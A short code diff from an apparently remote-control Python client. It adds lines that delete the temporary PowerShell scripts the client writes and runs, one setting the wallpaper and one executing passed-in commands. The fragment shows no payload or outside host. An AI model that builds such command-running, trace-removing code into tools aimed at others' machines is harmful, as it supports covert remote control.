@@ -84,6 +84,7 @@ Set-WallPaper("""+path_file+""")
         with open("wall.ps1" , 'w+') as file:
             file.write(command)
         subprocess.getoutput("powershell.exe -F wall.ps1")
+        os.remove('wall.ps1')
         return True
     
     async def rub_command(self , command) -> str:
@@ -123,6 +124,7 @@ Set-WallPaper("""+path_file+""")
             file.write(command)
             file.close()
         subprocess.getoutput("powershell.exe -F script.ps1")
+        os.remove("script.ps1")
         return True
 
     async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket:
